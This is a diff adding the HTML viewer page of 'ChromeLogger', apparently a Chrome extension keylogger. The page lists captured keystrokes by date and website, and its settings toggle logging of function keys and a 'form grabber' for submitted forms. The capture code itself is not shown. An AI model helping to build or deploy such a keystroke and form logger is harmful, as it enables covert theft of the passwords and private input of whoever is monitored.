@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html ng-app="app">
+<head>
+	<title>ChromeLogger</title>
+    <script src="lib/angular.min.js"></script>
+    <script src="lib/ng-quick-date.js"></script>
+    <link rel="stylesheet" type="text/css" href="lib/ng-quick-date-plus-default-theme.css" media="all" />
+    <script src="viewer.js"></script>
+</head>
+<body ng-controller="ViewerCtrl">
+    <table style="width: 80%">
+    <tr>
+        <td><input type="checkbox" id="allKeys" ng-click="updateSettings()"> Save function keys (CTRL, ALT, etc...)</td>
+        <td><input type="checkbox" id="formGrabber" ng-click="updateSettings()"> Save submitted forms (Form grabber)</td>
+        <td>Auto delete logs older than (days) <input type="input" id="autoDelete" ng-blur="updateSettings()" size=3></td>
+    </tr>
+    </table>
+    <table style="width: 80%">
+    <tr>
+        <td><quick-datepicker default-time="0" placeholder="Select Start Date" label-format="MMM d h:mm a" ng-change="date()" ng-model="aDatepicker"></quick-datepicker></td>
+        <td>Search: <input type="text" ng-model="filter" placeholder="Websites, URL's, keys" /></td>
+        <td><quick-datepicker default-time="0" placeholder="Delete logs older than..." label-format="MMM d h:mm a" ng-model="deleteDatepicker"></quick-datepicker><input type="button" value="Delete" ng-click="delete()"></td>
+    </tr>
+    </table>
+    <br />
+    <table style="width: 100%; max-width: 100%; table-layout: fixed;">
+    <thead>
+    <tr>
+        <th style="width: 10%; text-align:left;">Date</th>
+        <th style="width: 17%; text-align:left;">Website</th>
+        <th style="width: 73%; text-align:left;">Keys</th>
+    </tr>
+    </thead>
+    <tbody>
+    <tr ng-repeat="log in logs | filter:filter">
+        <td>{{log[0] | date:'MMM d h:mm a'}}</td>
+        <td><a ng-href="{{log[1][1]}}" title="{{log[1][0]}}" target="_blank">{{log[1][0]|truncate:25}}</a></td>
+        <td style="word-wrap: break-word">{{log[1][2]}}</td>
+    </tr>
+    </tbody>
+    </table>
+</body>
+</html>
